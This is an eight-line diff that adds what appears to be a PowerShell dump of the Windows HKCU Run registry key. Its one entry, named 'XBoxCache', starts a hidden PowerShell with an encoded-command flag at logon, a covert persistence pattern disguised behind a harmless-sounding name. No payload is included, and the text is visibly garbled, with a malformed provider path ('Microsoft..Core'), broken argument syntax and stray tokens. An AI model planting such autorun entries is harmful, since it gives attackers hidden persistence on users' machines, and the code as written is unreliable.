@@ -1,0 +1,8 @@
+_m03tsfc: @{
+    XBoxCache = cmd /c start /min "" -windowStyle hidden -c(-windowStyle hidden -enC);
+    PSPath = Microsoft..Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run;
+    PSParentPath = Microsoft..Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion;
+    PSChildName = Run;
+    PSDrive = HKCU;
+    PSProvider = Microsoft..Core\Registry
+} 0
